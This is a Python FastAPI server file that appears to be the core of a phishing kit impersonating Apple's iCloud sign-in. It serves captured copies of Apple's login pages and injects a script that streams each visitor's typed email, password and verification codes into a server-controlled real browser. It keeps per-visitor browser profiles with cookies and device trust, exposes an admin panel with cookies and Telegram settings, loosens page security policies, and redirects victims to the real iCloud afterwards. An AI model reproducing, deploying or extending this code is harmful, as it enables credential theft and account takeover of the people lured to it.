"""FastAPI server on port 9002.

Visiting http://localhost:9002 serves client.html. That page opens the real
browser (icloud.com, Sign In pressed); once Sign In has been clicked, the app
goes to a page that was captured earlier - ``src/1.html`` - as a document of
its own, not inside a frame.

The mirrored capture pipeline is gone. There is no agent in the real browser,
no document stream, no resource proxy and no engine rebuilding a page from a
capture: the captured HTML in ``src/`` *is* the page. What the server does now
is keep every viewer of it in step, because a static file cannot:

* it injects ``/sync.js`` into every captured page it serves, and
* it holds the shared state - which page everyone is on, and every form value
  that has been typed - and relays changes over ``/ws``.

So anything done in the captured page is reflected server-side: it is stored
by the hub and handed to the next viewer (and to the next reload) instead of
living only in one browser tab.

    python server.py
"""

import asyncio
import html as html_module
import json
import urllib.parse
import logging
import mimetypes
import os
import re
import secrets
import sys
import time
from contextlib import asynccontextmanager
from pathlib import Path
from urllib.parse import quote, urlsplit

from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import (FileResponse, HTMLResponse, JSONResponse,
                             RedirectResponse, Response)

import admin
import live
import telegram as telegram_module

HERE = Path(__file__).parent

# Where the captured pages live. The environment variable exists so the tests
# can point at a scratch folder; in normal use it is just ``./src``.
SRC = Path(os.environ.get("ICLOUD_SRC") or (HERE / "src")).resolve()

# The page the app goes to once the browser is up. Everything in src/ is
# served, but this is the one it opens first.
START_PAGE = "/src/1.html"

# Where a person who has finished is sent: the place they came for. The
# captures are closed to somebody who has already got in - there is nothing
# left in them to do.
ICLOUD = "https://www.icloud.com/"

# The Sign In button on the icloud.com landing page. The browser still opens
# and this is still clicked - the user signs in there themselves - but nothing
# is captured from it any more.
SIGNIN_BUTTON = "ui-button.sign-in-button"

# Where each visitor's browser keeps its profile. A profile is a browser's
# memory: the cookies, the "trust this device" answer, the half-typed
# address. Giving every visitor their own directory is what lets two people
# use the app at the same time without signing in as each other.
PROFILES = Path(os.environ.get("ICLOUD_PROFILES") or (HERE / "visitors")).resolve()

# The cookie that says which visitor this is. It is a name, not a secret:
# it says whose browser this is, and nothing else.
SESSION_COOKIE = "icloud_session"

# What a visitor's name may look like. It is a name the server made, so it
# is checked before it is used as a folder name.
SESSION_ID = re.compile(r"^[A-Za-z0-9_-]{8,64}$")


def session_cookie(session_id: str) -> str:
    """The cookie that says who this is.

    It has to be a real ``Set-Cookie``: a header called ``icloud_session``
    with a name in it is just a header, and the browser keeps no cookie, and
    then every request looks like a new visitor - twenty sessions for one
    person, each with a browser and a profile of its own.
    """
    return (f"{SESSION_COOKIE}={session_id}; Path=/; Max-Age=31536000; "
            "SameSite=Lax")

# How long a visitor's browser is kept open after they have gone away. The
# profile is kept either way - that is the session - but the browser window
# is not left open for ever.
SESSION_IDLE_SECONDS = 15 * 60

# How long the app waits for the browser to accept what was typed into it
# before it gives up and leaves the visitor where they are.
WAIT_FOR_BROWSER_SECONDS = 120

# Tried in order. Bundled Chromium needs a download; Chrome and Edge are
# usually already on the machine, so if either is there we skip it entirely.
BROWSERS = [
    # System Chrome first: it is the browser the machine already has, it is
    # the one the person is used to, and it is there without a download. The
    # bundled Chromium is the fallback for a machine with no Chrome.
    ("system chrome", {"channel": "chrome"}),
    ("bundled chromium", {}),
    ("system edge", {"channel": "msedge"}),
]


@asynccontextmanager
async def lifespan(app: FastAPI):
    """The app starts by looking at the browsers.

    There may not be one yet - a browser opens when its owner visits - and
    then there is nothing to look at. The watcher copes with that: it
    waits, and it starts reporting as soon as there is something to report.
    """
    start_watching()
    yield


app = FastAPI(lifespan=lifespan)

# The control room: the clients, the Telegram settings, and the cookies. It
# is mounted here because it is part of this server and knows the same
# sessions.
app.include_router(admin.ROUTER)

state = {
    "status": "idle",      # idle | running | done | error
    "step": "",
    "error": "",
    "browser_open": False,
}

# What a captured page gets on the way out. None of it is written into the
# file on disk: the file stays exactly what was captured, and these are put in
# as it is served. There is no write path for src/ at all.
SYNC_TAG = '<script src="/sync.js"></script>'

# A capture is served exactly as it was captured. The one thing added is this
# tag, and only this tag. Nothing is removed, no meta is rewritten, no policy
# is touched.

NO_STORE = {"Cache-Control": "no-store"}


# --------------------------------------------------------------------------
# Console output
# --------------------------------------------------------------------------

# The page polls /status every 2s, which buries everything else in the console.
# The rendered line looks like: 127.0.0.1:5900 - "GET /status HTTP/1.1" 200
class _DropStatusPolls(logging.Filter):
    def filter(self, record):
        return "/status HTTP" not in record.getMessage()


logging.getLogger("uvicorn.access").addFilter(_DropStatusPolls())


def log(message):
    """Progress in the console, so a stuck run is diagnosable."""
    print(f"[icloud] {message}", flush=True)
    state["step"] = message


# --------------------------------------------------------------------------
# The real browser: opened for the sign-in, and nothing else
# --------------------------------------------------------------------------

async def install_chromium():
    """Download Chromium, streaming the progress so a stall is visible."""
    log("installing chromium - download progress follows")
    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "playwright", "install", "chromium",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )

    chunks = []
    while True:
        chunk = await proc.stdout.read(1024)
        if not chunk:
            break
        chunks.append(chunk)
        # Playwright draws a progress bar with \r, so pass it through raw.
        print(chunk.decode(errors="replace"), end="", flush=True)

    await proc.wait()
    print(flush=True)

    output = b"".join(chunks).decode(errors="replace")
    if proc.returncode != 0:
        raise RuntimeError(pick_reason(output))
    log("chromium installed")


def pick_reason(text: str) -> str:
    """Pull the real error out of Playwright's noisy Node.js output."""
    lines = [line.strip() for line in text.splitlines() if line.strip()]

    # First "Error:" line is the root cause; later ones just restate it.
    for line in lines:
        if line.startswith("Error:"):
            return line[len("Error:"):].strip() or line

    # Otherwise take the last line that isn't stack-trace noise.
    for line in reversed(lines):
        if not line.startswith(("at ", "{", "}")):
            return line

    return "could not install chromium"


async def launch(session: "Session"):
    """Open a visible browser window with whatever is available.

    The window keeps this visitor's own profile, so the session they had
    last time is the session they get this time: the cookies, the "trust
    this device" answer, the half-typed address.

    Returns (context, page). Raises once every candidate has failed, with all
    the reasons joined so the caller can tell a missing download from a
    genuinely broken setup.
    """
    reasons = []

    profile = session.profile()
    profile.mkdir(parents=True, exist_ok=True)

    for label, extra in BROWSERS:
        try:
            log(f"launching {label}")
            browser_ctx = await session.pw.chromium.launch_persistent_context(
                str(profile),
                headless=False,
                no_viewport=True,
                args=["--start-maximized"],
                **extra,
            )
        except Exception as exc:
            reason = str(exc).splitlines()[0]
            log(f"{label} unavailable: {reason}")
            reasons.append(reason)
            continue

        browser_page = browser_ctx.pages[0] if browser_ctx.pages else await browser_ctx.new_page()
        log(f"browser open ({label})")
        return browser_ctx, browser_page

    raise RuntimeError(" | ".join(reasons) or "no browser could be launched")


def bring_new_tab_to_front(session: "Session", new_page):
    """The sign-in flow may open a tab of its own; the user should see it."""
    if new_page is session.page:
        return

    async def front():
        try:
            await new_page.bring_to_front()
        except Exception:
            pass

    asyncio.create_task(front())


@app.get("/")
async def index(request: Request):
    """The launcher, until the browser is open and Sign In has been clicked.

    After that the captured page *is* the app, so this redirects to it. A
    reload must not pretend the browser has to be opened again - and a top
    level document means the capture is laid out as a page of its own,
    instead of being squeezed into a frame inside another document.
    """
    # A request that says who the visitor is belongs to that visitor's
    # session. A request that says nothing belongs to nobody: the page has
    # not named itself yet, and making a session here would give one person
    # two - the one the page asks for, and the one the page's own request
    # made on the way in.
    session = session_for_named(request)
    cookie = ({"Set-Cookie": session_cookie(session.id)}
              if session is not None else {})
    if session is not None and session.hub.finished:
        # The person has finished the process: the launcher sends them to
        # iCloud as well, not to a capture.
        return RedirectResponse(ICLOUD, status_code=307, headers=cookie)
    if session is not None and session.state["status"] == "done":
        return RedirectResponse(session.hub.page, status_code=307,
                                headers=cookie)
    # no-store, so an edit to client.html shows up on refresh instead of
    # serving the browser's cached copy.
    return FileResponse(HERE / "client.html",
                        headers={**NO_STORE, **cookie})


@app.get("/start")
async def start(request: Request):
    """Launch this visitor's browser and press Sign In."""
    session = session_for(visitor_of(request))
    state = await start_browser(session)
    # The cookie says the same thing on every request from now on, so the
    # page does not have to say it again.
    return JSONResponse(state,
                        headers={"Set-Cookie": session_cookie(session.id)})


async def start_browser(session: "Session"):
    """Launch this visitor's browser and press Sign In. Nothing is captured."""
    if session.state["status"] in ("running", "done"):
        log(f"/start ignored, already {session.state['status']}")
        return session.state

    session.state.update(status="running", error="", browser_open=False)

    try:
        # Imported here rather than at module load: serving the captured pages
        # does not need Playwright, and a machine without it should still be
        # able to open the app and read the error on /status.
        from playwright.async_api import async_playwright

        if session.pw is None:
            session.pw = await async_playwright().start()

        try:
            session.ctx, session.page = await launch(session)
        except Exception as exc:
            # Nothing to run yet - download Chromium, then try once more.
            if "Executable doesn't exist" not in str(exc):
                raise
            await install_chromium()
            session.ctx, session.page = await launch(session)

        session.state["browser_open"] = True

        # The browser is the session. The capture is a copy of a moment of
        # it, and this is what connects the two: what is typed into the
        # capture is written into the browser, and what the browser is
        # showing is written back into the capture.
        session.bridge.attach(session.ctx, session.page)

        # A tab the sign-in flow opens is where the user will be typing.
        session.ctx.on("page", lambda page: bring_new_tab_to_front(session, page))

        log("going to icloud.com")
        await session.page.goto("https://www.icloud.com/", wait_until="domcontentloaded")
        await session.page.bring_to_front()

        log("clicking Sign In")
        await session.page.locator(SIGNIN_BUTTON).first.click(timeout=15000)

        session.state["status"] = "done"
        log("done - sign in yourself in the browser window")

    except Exception as exc:
        session.state["status"] = "error"
        session.state["error"] = str(exc).splitlines()[0]
        log(f"FAILED: {session.state['error']}")
        admin.note("error", session=session.id)

    return session.state


@app.get("/status")
async def status(request: Request):
    """What this visitor's browser is doing.

    This only reads, so it only *looks* the session up. A poll that made a
    session of its own would give one person a new browser every two
    seconds - which is what a poll does when the cookie is not sticking.
    """
    session = session_lookup(visitor_of(request))
    if session is None:
        return {"status": "idle", "browser_open": False, "error": "",
                "page": None, "browser": None, "session": ""}
    return {**session.state, "page": session.hub.page,
            "browser": session.hub.browser, "session": session.id}


# --------------------------------------------------------------------------
# The captured pages
#
# src/ is served as it is. The file on disk is never written to, and the
# document is not rebuilt: scripts, styles, metas, policy and markup all go
# out as they came in. Three things are added on the way out, and each of
# them is something the engine needs:
#
#   * /sync.js, so the page reports what is done to it to the server;
#   * the capture's own Content-Security-Policy, extended with the sources
#     the engine needs - without this the policy refuses the engine that
#     was just added to it, and the page is a picture of a page;
#   * the frames the capture carries, given the page's own origin - without
#     this the sign-in form inside the frame cannot be reached at all.
#
# The tag goes in once: before </head>, or after <body> when the capture has
# no head, or at the top when it has neither.
# --------------------------------------------------------------------------

_SYNC_PRESENT = re.compile(r"""<script\b[^>]*\bsrc\s*=\s*["']?/sync\.js""", re.IGNORECASE)
_HTML_SUFFIXES = (".html", ".htm")


# --------------------------------------------------------------------------
# Reading the document
#
# A capture is a copy of a page, and the copy has the copy's own quirks. The
# one that matters here is that a tag's attributes have to be read properly:
# a SingleFile capture keeps a whole nested document inside an
# <iframe srcdoc="..."> attribute, and that document's tags are part of the
# attribute value, not part of the page. A ">" inside the value does not end
# the tag, and a "</head>" inside it does not end the page's head.
# --------------------------------------------------------------------------


def _tags(page_html: str):
    """Every tag in the document, in order.

    Yields (start, end, name, closing, text): where the tag is, what it is
    called, whether it closes, and the tag itself.
    """
    size = len(page_html)
    i = 0
    while i < size:
        i = page_html.find("<", i)
        if i < 0:
            return

        if page_html.startswith("<!--", i):
            end = page_html.find("-->", i + 4)
            if end < 0:
                return
            i = end + 3
            continue

        j = i + 1
        closing = page_html.startswith("/", j)
        if closing:
            j += 1

        name_at = j
        while j < size and page_html[j] not in " \t\r\n/>":
            j += 1
        name = page_html[name_at:j].lower()

        # Walk to the end of the tag, stepping over quoted attribute values.
        k = j
        while k < size:
            char = page_html[k]
            if char in "\"'":
                k = page_html.find(char, k + 1)
                if k < 0:
                    return
                k += 1
                continue
            if char == ">":
                break
            k += 1
        if k >= size:
            return

        yield i, k + 1, name, closing, page_html[i:k + 1]
        i = k + 1


def _attributes(tag_text: str):
    """The attributes of a start tag.

    Yields (name, value start, value end, quote). The span is into the tag
    text itself, so the caller can find the value again.
    """
    size = len(tag_text)
    i = 1
    while i < size and tag_text[i] not in " \t\r\n/>":
        i += 1

    while i < size:
        while i < size and tag_text[i] in " \t\r\n/":
            i += 1
        if i >= size or tag_text[i] == ">":
            break

        name_at = i
        while i < size and tag_text[i] not in " \t\r\n=/>":
            i += 1
        name = tag_text[name_at:i].lower()

        j = i
        while j < size and tag_text[j] in " \t\r\n":
            j += 1

        if j < size and tag_text[j] == "=":
            j += 1
            while j < size and tag_text[j] in " \t\r\n":
                j += 1
            if j < size and tag_text[j] in "\"'":
                quote = tag_text[j]
                start = j + 1
                end = tag_text.find(quote, start)
                if end < 0:
                    end = size
                yield name, start, end, quote
                i = end + 1
            else:
                start = j
                while j < size and tag_text[j] not in " \t\r\n>":
                    j += 1
                yield name, start, j, ""
                i = j
        else:
            yield name, i, i, ""


# --------------------------------------------------------------------------
# The capture's own policy
#
# A capture carries the policy of the page it was taken from, and that policy
# is as tight as policies get: "default-src 'none'", so nothing loads and
# nothing runs unless it is named. The engine is a script of ours, from our
# own origin, and it opens a socket to our own origin - and the policy says
# no to both, because it was written for a page that has no engine in it.
#
# So the policy is extended, not replaced: the sources the engine needs are
# added to the directives that are already there, and nothing else is
# widened. Everything the capture forbade stays forbidden, so the page still
# renders exactly as it was captured.
#
#   * script-src gains 'self', so the engine can be loaded at all;
#   * connect-src gains 'self' and the websocket schemes, so its socket can
#     be opened.
#
# A policy that says nothing about scripts is left alone: it already allows
# them.
# --------------------------------------------------------------------------

CSP_ENGINE_SCRIPT = "'self'"
CSP_ENGINE_CONNECT = "'self' ws: wss:"


def _relax_policy(policy: str) -> str:
    """The policy, with the engine's own sources added to it."""
    parts = [part.strip() for part in policy.split(";") if part.strip()]
    names = [part.split()[0].lower() for part in parts]

    def named(part: str, directive: str) -> bool:
        return part.split()[0].lower() == directive

    def widened(part: str, sources: str) -> str:
        """The directive with the sources it is missing."""
        tokens = part.split()
        for source in sources.split():
            if source not in tokens:
                part = part + " " + source
        return part

    if "script-src" in names or "script-src-elem" in names:
        parts = [
            widened(part, CSP_ENGINE_SCRIPT)
            if named(part, "script-src") or named(part, "script-src-elem")
            else part
            for part in parts
        ]
    elif "default-src" in names:
        # Scripts follow default-src, so they have to be named to be widened.
        parts.append("script-src " + CSP_ENGINE_SCRIPT)

    if "connect-src" in names:
        # 'self' alone is not enough for the socket everywhere: a browser that
        # does not treat ws:// as the same origin as http:// would refuse it.
        parts = [
            widened(part, CSP_ENGINE_CONNECT) if named(part, "connect-src") else part
            for part in parts
        ]
    elif "default-src" in names:
        parts.append("connect-src " + CSP_ENGINE_CONNECT)

    return "; ".join(parts)


def _relax_csp(page_html: str) -> str:
    """The capture's policy, extended for the engine.

    Only the metas that are really in the page are touched: the nested
    document inside an <iframe srcdoc="..."> has a policy of its own, and
    that one is left alone.
    """
    edits = []

    for start, end, name, closing, text in _tags(page_html):
        if closing or name != "meta":
            continue

        equiv = None
        content = None
        for attr_name, a_start, a_end, quote in _attributes(text):
            if attr_name == "http-equiv":
                equiv = text[a_start:a_end].strip().lower()
            elif attr_name == "content":
                content = (a_start, a_end)

        if equiv != "content-security-policy" or content is None:
            continue

        a_start, a_end = content
        policy = text[a_start:a_end]
        relaxed = _relax_policy(policy)
        if relaxed != policy:
            edits.append((start + a_start, start + a_end, relaxed))

    for a, b, replacement in reversed(edits):
        page_html = page_html[:a] + replacement + page_html[b:]
    return page_html


# --------------------------------------------------------------------------
# The frames a capture carries
#
# A SingleFile capture keeps the sign-in form inside an <iframe srcdoc="...">,
# and that frame is sandboxed without allow-same-origin: it is a frame of an
# origin of its own, so the page cannot reach it - not its fields, not its
# buttons, nothing. The engine lives in the page, so the form would be a
# picture of a form.
#
# So a frame the capture carries is given the page's own origin. Nothing
# else about it changes: it keeps its sandbox, and it keeps its scripts.
# --------------------------------------------------------------------------


def _make_frames_reachable(page_html: str) -> str:
    """The frames the capture carries, given the page's own origin."""
    edits = []

    for start, end, name, closing, text in _tags(page_html):
        if closing or name != "iframe":
            continue

        attrs = list(_attributes(text))
        if not any(attr_name == "srcdoc" for attr_name, _, _, _ in attrs):
            continue

        for attr_name, a_start, a_end, quote in attrs:
            if attr_name != "sandbox" or quote == "":
                continue
            if "allow-same-origin" in text[a_start:a_end].split():
                continue
            edits.append((start + a_end, start + a_end, " allow-same-origin"))
            break

    for a, b, replacement in reversed(edits):
        page_html = page_html[:a] + replacement + page_html[b:]
    return page_html


def _insert_point(page_html: str) -> int | None:
    """Where the engine tag goes: before </head>, else after <body>, else None.

    Tags inside a quoted attribute value are skipped. SingleFile captures keep
    a whole nested document in an <iframe srcdoc="..."> attribute, so their
    first </head> belongs to that inner document, not to the page: dropping a
    tag there would end the attribute early and cut the frame open.
    """
    for start, end, name, closing, text in _tags(page_html):
        if closing and name == "head":
            return start
        if not closing and name == "body":
            return end
    return None


def with_engine(page_html: str) -> str:
    """The capture with the engine in it, and the two things the engine needs.

    Idempotent: a page that has been through this once is left alone.
    """
    if _SYNC_PRESENT.search(page_html):
        return page_html

    page_html = _relax_csp(page_html)
    page_html = _make_frames_reachable(page_html)

    at = _insert_point(page_html)
    if at is None:
        return SYNC_TAG + page_html
    return page_html[:at] + SYNC_TAG + page_html[at:]


def captured_files(folder: Path) -> list[Path]:
    if not folder.is_dir():
        return []
    return sorted(
        p for p in folder.iterdir()
        if p.is_file() and p.suffix.lower() in _HTML_SUFFIXES
    )


def page_links(folder: Path) -> str:
    pages = captured_files(folder)
    if not pages:
        return (
            "<p>No captured pages yet. Put them in <code>src/</code>, "
            "starting with <code>1.html</code>.</p>"
        )
    links = "".join(
        f'<li><a href="/src/{quote(p.name)}">{html_module.escape(p.name)}</a></li>'
        for p in pages
    )
    return f"<ul>{links}</ul>"


PAGE_STYLE = """
  :root { color-scheme: dark; }
  body { margin:0; min-height:100vh; display:flex; align-items:center;
         justify-content:center; background:#000; color:#f5f5f7;
         font:16px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
  main { max-width:44rem; padding:2.5rem 1.5rem; }
  h1 { font-size:1.35rem; margin:0 0 .75rem; font-weight:600; }
  p { color:#a1a1a6; margin:.6rem 0; }
  code { background:#1c1c1e; padding:.1rem .35rem; border-radius:.3rem; color:#f5f5f7; }
  ul { padding-left:1.2rem; }
  li { margin:.25rem 0; }
  a { color:#0a84ff; }
"""


def page_document(title: str, body: str) -> str:
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{html_module.escape(title)}</title>
<style>{PAGE_STYLE}</style>
</head>
<body><main>{body}</main></body>
</html>
"""


def listing_page(folder: Path) -> str:
    body = (
        "<h1>Captured pages</h1>"
        "<p>The app opens <code>1.html</code> once the browser is up. Every "
        "page here runs <code>/sync.js</code>, so what you type and click is "
        "reflected server-side and follows you between viewers.</p>"
        + page_links(folder)
    )
    return page_document("Captured pages", body)


def missing_page(path: str, folder: Path) -> str:
    where = (
        f"<code>src/{html_module.escape(path)}</code>" if path else "<code>src/</code>"
    )
    body = (
        f"<h1>Nothing captured at {where} yet</h1>"
        "<p>This route serves the HTML files that were captured earlier. Drop "
        "the capture into <code>src/</code> - starting with <code>1.html</code> "
        "- and reload.</p>"
        + page_links(folder)
    )
    return page_document("No captured page", body)


@app.get("/src")
@app.get("/src/{path:path}")
async def captured(request: Request, path: str = ""):
    """Serve a captured page (with the sync engine) or one of its assets.

    The visitor is named on the way out as well, so that a capture opened
    directly is still that visitor's capture - and still their browser.
    """
    folder = SRC.resolve()
    path = path.lstrip("/")

    # A person who has finished the process is sent to iCloud instead: the
    # code was good, the browser is in, and there is nothing left in the
    # captures for them to do.
    finished = session_lookup(visitor_of(request))
    if finished is not None and finished.hub.finished:
        return RedirectResponse(ICLOUD, status_code=302)

    if not path:
        if folder.is_dir():
            return HTMLResponse(listing_page(folder))
        return HTMLResponse(missing_page("", folder), status_code=404)

    target = (folder / path).resolve()
    try:
        target.relative_to(folder)
    except ValueError:
        # ../ or an absolute path: never read outside src/.
        return HTMLResponse(missing_page(path, folder), status_code=404)

    if target.is_dir():
        return HTMLResponse(listing_page(target))

    if not target.is_file():
        return HTMLResponse(missing_page(path, folder), status_code=404)

    if target.suffix.lower() in _HTML_SUFFIXES:
        # A capture is a page, and a page is somebody's: the visitor is
        # named on the way out, so that a capture opened directly is still
        # that visitor's capture - and still their browser. The stylesheets
        # and the scripts are not pages, and they are nobody's.
        session = session_for_named(request)
        source = target.read_text(encoding="utf-8", errors="replace")
        cookie = ({"Set-Cookie": session_cookie(session.id)}
                  if session is not None else {})
        return HTMLResponse(with_engine(source),
                            headers={**NO_STORE, **cookie})

    media_type = mimetypes.guess_type(target.name)[0] or "application/octet-stream"
    return Response(
        content=target.read_bytes(),
        media_type=media_type,
        headers={"Cache-Control": "no-store"},
    )


@app.get("/sync.js")
async def sync_js():
    """The engine that runs inside every captured page."""
    return FileResponse(
        HERE / "sync.js",
        media_type="text/javascript",
        headers=NO_STORE,
    )


# --------------------------------------------------------------------------
# Live sync
#
# The captured page is a file, so nothing in it can know what anyone else is
# doing. The server is the shared state instead: which page is on screen, and
# every form value that has been typed into it. A viewer that connects is given
# that state; changes are broadcast to the other viewers; a click is relayed as
# a marker rather than replayed, because replaying it would press the button a
# second time.
# --------------------------------------------------------------------------

def clean_page(value) -> str:
    """A page we are willing to send a viewer to: inside /src/, and HTML."""
    if not isinstance(value, str):
        return ""
    if not value.startswith("/src/") or ".." in value:
        return ""
    if not value.lower().endswith(_HTML_SUFFIXES):
        return ""
    return value


def edit_go(page: str, field: str) -> str:
    """Where a capture goes when a field on it is edited.

    The flow says: editing the address on the password step takes the
    capture back to the address, the way iCloud does it. Nothing else is
    said, and nothing else moves.
    """
    for step in flow_steps():
        if step.get("page") != page:
            continue
        edits = step.get("edits")
        if not isinstance(edits, dict):
            continue
        go = clean_page(edits.get(field))
        if go:
            return go
    return ""


def came_from_a_capture(referrer) -> bool:
    """Was this document reached from another captured page?

    A viewer that has just loaded ``/src/2.html`` from a link on ``/src/1.html``
    is following a link, and the page it came from says so. A viewer that has
    just opened the app has the parent page as its referrer, and is not.
    """
    if not isinstance(referrer, str) or not referrer:
        return False
    try:
        path = urlsplit(referrer).path
    except ValueError:
        return False
    return path.startswith("/src/") and path.lower().endswith(_HTML_SUFFIXES)


class Viewer:
    """One browser tab watching a captured page.

    Messages go through a queue so a viewer that has stopped reading cannot
    block the others: it misses a keystroke rather than stalling the page.
    """

    def __init__(self, websocket: WebSocket):
        self.websocket = websocket
        self.queue: asyncio.Queue = asyncio.Queue(maxsize=200)
        self.task = asyncio.create_task(self._pump())

    async def _pump(self):
        while True:
            message = await self.queue.get()
            await self.websocket.send_json(message)

    def send(self, message: dict) -> None:
        try:
            self.queue.put_nowait(message)
        except asyncio.QueueFull:
            pass

    def close(self) -> None:
        self.task.cancel()


class Hub:
    """The page everyone is on, what has been done to it, and where the
    browser is."""

    def __init__(self):
        self.viewers: set[Viewer] = set()
        self.page = START_PAGE
        self.values: dict[str, dict] = {}
        self.browser: dict = {"url": "", "title": "", "fields": {}}
        # Has this visitor finished? Then the captures are closed to them.
        self.finished = False
        # The session this hub belongs to. It is what the hub tells when
        # the person is here.
        self.session = None

    def snapshot(self) -> dict:
        # A copy: the message sits in a queue, and a navigation in the meantime
        # must not empty the values the viewer was promised.
        return {
            "t": "state",
            "page": self.page,
            "values": {key: dict(entry) for key, entry in self.values.items()},
        }

    def join(self, viewer: Viewer) -> None:
        self.viewers.add(viewer)
        if self.session is not None:
            self.session.touch()
        viewer.send(self.snapshot())
        # Where the browser is, so a viewer that joins late is looking at the
        # same session the others are.
        viewer.send({"t": "browser", **self.browser})

    def leave(self, viewer: Viewer) -> None:
        self.viewers.discard(viewer)
        viewer.close()

    def broadcast(self, message: dict, sender: Viewer | None = None) -> None:
        for viewer in list(self.viewers):
            if viewer is not sender:
                viewer.send(message)

    def navigate(self, page, sender: Viewer | None = None, everyone: bool = False) -> bool:
        """Follow the viewer that moved to another captured page.

        ``everyone`` is for a move that the viewer itself did not make: a
        button press that leads to the next step. The viewer that pressed
        it has to be told as well, or it stays where it was while everybody
        else moves on.
        """
        page = clean_page(page)
        if not page or page == self.page:
            return False
        if self.finished:
            # The person has finished the process. There is nothing to go
            # back to: the captures are closed to somebody who has already
            # got in.
            return False
        self.page = page
        # Form values belong to the page they were typed on.
        self.values = {}
        log(f"page: {page}")
        self.broadcast({"t": "nav", "page": page},
                       sender=None if everyone else sender)
        return True

    def go_to_icloud(self) -> None:
        """The person has finished: the app takes them to iCloud.

        The code was good and the browser is in. Every viewer is sent there,
        and the captures are closed to them from then on.
        """
        if not self.finished:
            admin.note("finished")
        self.finished = True
        self.page = ICLOUD
        # Form values belong to the page they were typed on.
        self.values = {}
        log("going to icloud.com")
        # The client is told it has finished before it goes, so that its
        # own browser keeps the fact: that is what sends it back to iCloud
        # next time instead of through the whole thing again.
        self.broadcast({"t": "finished", "page": ICLOUD})

    def handle(self, viewer: Viewer, message, session=None) -> None:
        if not isinstance(message, dict):
            return

        kind = message.get("t")

        # Anything the page says is the person doing something. This is
        # what keeps a session alive while somebody is working in it, and
        # it is the opposite of the server's own polling, which is not the
        # person being here at all.
        if session is not None:
            session.touch()

        if kind == "hello":
            # A viewer that has just loaded asks what it should be showing.
            # If it got there by following a link, that is a navigation - the
            # beacon may have been lost on the way - so the hub follows it.
            #
            # Their own browser says where they got to. Somebody who has
            # already got in is sent to iCloud and not through the whole
            # thing again; somebody whose browser has no state, or whose
            # state does not say they finished, starts the process as
            # usual.
            state = message.get("state")
            if isinstance(state, dict) and state.get("finished"):
                log(f"session {session.id if session else '?'} has finished "
                    f"- going to icloud.com")
                self.go_to_icloud()
                return
            if came_from_a_capture(message.get("from")):
                self.navigate(message.get("page"), sender=viewer)
            viewer.send(self.snapshot())

        elif kind == "nav":
            self.navigate(message.get("page"), sender=viewer)

        elif kind == "value":
            key = message.get("key")
            if not isinstance(key, str) or not key or len(key) > 2000:
                return
            raw_value = message.get("value")
            entry = {
                "value": raw_value[:10000] if isinstance(raw_value, str) else "",
                "checked": bool(message.get("checked")),
            }
            self.values[key] = entry
            self.broadcast({"t": "value", "key": key, **entry}, sender=viewer)

        elif kind == "click":
            x, y = message.get("x"), message.get("y")
            if not isinstance(x, (int, float)) or not isinstance(y, (int, float)):
                return
            self.broadcast(
                {
                    "t": "click",
                    "key": str(message.get("key") or "")[:2000],
                    "x": x,
                    "y": y,
                },
                sender=viewer,
            )

        elif kind == "where":
            # "Where is the browser?" A document has just been bound and may
            # hold fields the browser knows about and the page does not, so
            # the state is sent again to this viewer.
            viewer.send({"t": "browser", **self.browser})

        elif kind == "field":
            # A value typed into the capture, written into the browser the
            # server holds. The capture keeps the ids of the page it was
            # taken from, so the field with that id in the capture is the
            # field with that id in the browser - in whichever frame of the
            # browser has it.
            #
            # A control with no id - Apple's verification code boxes have
            # none - is named by its place instead: the third input of the
            # page, and how many inputs it has.
            if session is None:
                return

            element = live.element_id(message.get("id"))
            value = message.get("value")
            value = value if isinstance(value, str) else ""

            if element:
                spawn(write_to_browser(session, element, value))
                return

            tag = message.get("tag")
            n = message.get("n")
            of = message.get("of")
            cls = message.get("cls")
            if isinstance(tag, str) and isinstance(n, int) and isinstance(of, int):
                spawn(write_at_to_browser(session, tag, n, of, value,
                                         cls if isinstance(cls, str) else ""))

        elif kind == "edit":
            # The person has changed a field on the capture. What that means
            # is the flow's business: editing the address on the password
            # step takes the capture back to the address, the way iCloud
            # does it.
            if session is None:
                return

            element = live.element_id(message.get("id"))
            if not element:
                return

            page = message.get("page")
            if not isinstance(page, str) or not page:
                page = self.page

            go = edit_go(page, element)
            if not go:
                return

            log(f"flow: {page} {element} edited -> {go}")
            # The browser keeps the new value: the field message that came
            # with this one has already put it there. The password goes with
            # it though - a password that went with an address is of no use
            # now the address is a different one. That is what iCloud does.
            spawn(write_to_browser(session, "password_text_field", ""))
            # Everyone moves, including the viewer that edited: it did not
            # follow a link, so nothing else would take it there.
            self.navigate(go, sender=viewer, everyone=True)

        elif kind == "press":
            # A button pressed in a capture. What it does depends on where
            # it was pressed: the flow says which capture leads to which,
            # and whether the press also happens in the browser.
            element = live.element_id(message.get("id"))
            if not element:
                return

            page = message.get("page")
            if not isinstance(page, str) or not page:
                page = self.page

            step = flow_step(page, element)
            if step is None:
                # No flow says otherwise, so the press happens in the
                # browser, as it always did.
                if session is not None:
                    spawn(press_in_browser(session, element))
                return

            if step.get("live") and session is not None:
                spawn(press_in_browser(session, element))

            go = step.get("go")
            if not isinstance(go, str) or not go:
                return

            if step.get("wait") and session is not None:
                # The capture does not move on because a button was
                # pressed: it moves when the browser has taken the details
                # and gone on to the next step. Until then the capture stays
                # where it is, and what the browser says about the details
                # is shown on it.
                browser = session.hub.browser or {}
                session.waiting = {
                    "field": element,
                    "fields": watch_fields(browser.get("fields") or {}),
                    "heading": browser.get("heading", ""),
                    "until": step.get("until") if isinstance(step.get("until"), dict) else {},
                    "url": browser.get("url", ""),
                    "go": go,
                    "page": page,
                    "since": time.monotonic(),
                }
                log(f"flow: {page} {element} -> {go} (waiting for the browser)")
                return

            log(f"flow: {page} {element} -> {go}")
            # Everyone moves, including the viewer that pressed: it did
            # not follow a link, so nothing else would take it there.
            self.navigate(go, sender=viewer, everyone=True)


# --------------------------------------------------------------------------
# The flow
#
# A capture is a step of a journey, and the journey is the user's: which
# capture leads to which, and whether a button pressed on one of them is
# also pressed in the browser.
#
# It is said in a file next to the captures, src/flow.json:
#
#   {
#     "steps": [
#       {"page": "/src/1.html", "press": "sign-in", "go": "/src/4.html",
#        "live": true},
